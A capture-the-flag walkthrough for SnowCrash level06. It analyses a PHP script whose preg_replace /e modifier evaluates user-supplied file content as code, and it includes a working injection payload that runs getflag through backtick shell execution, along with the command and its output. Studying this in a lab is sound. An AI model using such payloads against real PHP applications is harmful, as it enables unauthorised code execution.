We find two files, `level06` and `level06.php`

```
level06@SnowCrash:~$ ls
level06  level06.php
```

Inspecting `level06.php` reveals the following code:

```
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

1. **Function `y`**:

   - Replaces any `.` in the input with `x`
   - Replaces any `@` in the input with ` y`
   - This function formats input by substituting specific characters with other words.

2. **Function `x`**:

   - Reads the content of the file specified by `$y`.
   - Uses the regex `/(\[x (.*)\])/e` in `preg_replace`. The `/e` modifier makes PHP evaluate the replacement as code. Here, it calls `y(...)` on the captured content within the `[x ...]` brackets.
   - Replaces `[` with `(` and `]` with `)`, effectively transforming input into an evaluable expression.

3. **/e Modifier**:
   - The `/e` modifier allows PHP to interpret the replacement string as code, which is a vulnerability as it can allow for command injection when combined with specific inputs.

Our goal is to use this vulnerability to execute `getflag`.

1. **Creating Malicious Input**:

   - We create a file `/tmp/test` with content that will trigger command injection:
     `level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/test`
   - Here, `${`getflag`}` will run `getflag` in a shell, capturing its output as part of the evaluated string.

2. **Executing the Exploit**:
   - Running `level06 /tmp/test` feeds the crafted file into `level06.php`.
   - In the `x` function, `preg_replace` with `/e` executes `${`getflag`}`, running `getflag` and capturing the flag as output.

---

### Result

When we execute the command:

```
level06@SnowCrash:~$ ./level06 /tmp/test
```

The output returns:

```
No entry for terminal type "alacritty";
using dumb terminal settings.
PHP Notice:  Undefined variable: Check flag.Here is your token :
in /home/user/level06/level06.php(4) : regexp code on line 1
```

This notice appears due to PHP warnings, but the `getflag` command executes successfully, outputting the flag token.

---

This completes the exploit for Level06.
